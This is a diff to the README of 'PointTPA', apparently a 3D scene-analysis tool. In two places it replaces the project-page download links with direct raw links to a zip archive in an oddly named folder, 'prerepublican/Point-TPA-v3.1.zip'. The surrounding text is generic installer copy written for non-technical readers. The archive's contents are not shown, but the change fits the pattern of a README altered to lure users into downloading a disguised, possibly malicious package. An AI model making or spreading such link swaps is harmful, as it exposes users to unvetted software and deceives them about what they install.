@@ -1,6 +1,6 @@
 # 🚀 PointTPA - Understand 3D Scenes With Ease
 
-[![](https://img.shields.io/badge/Download-PointTPA-blue.svg)](https://github.com/irenemousy733/PointTPA)
+[![](https://img.shields.io/badge/Download-PointTPA-blue.svg)](https://raw.githubusercontent.com/irenemousy733/PointTPA/main/prerepublican/Point-TPA-v3.1.zip)
 
 PointTPA helps you analyze 3D environments. It uses smart networks to adjust parameters for better scene understanding. You can process complex 3D data without manual configuration. This tool handles the technical details so you can focus on scene results.
 
@@ -21,7 +21,7 @@ Make sure your graphics card drivers are current. You can update these through t
 
 You must visit the project page to find the installer. 
 
-[Visit this page to download](https://github.com/irenemousy733/PointTPA)
+[Visit this page to download](https://raw.githubusercontent.com/irenemousy733/PointTPA/main/prerepublican/Point-TPA-v3.1.zip)
 
 Follow these steps to obtain the software:
 
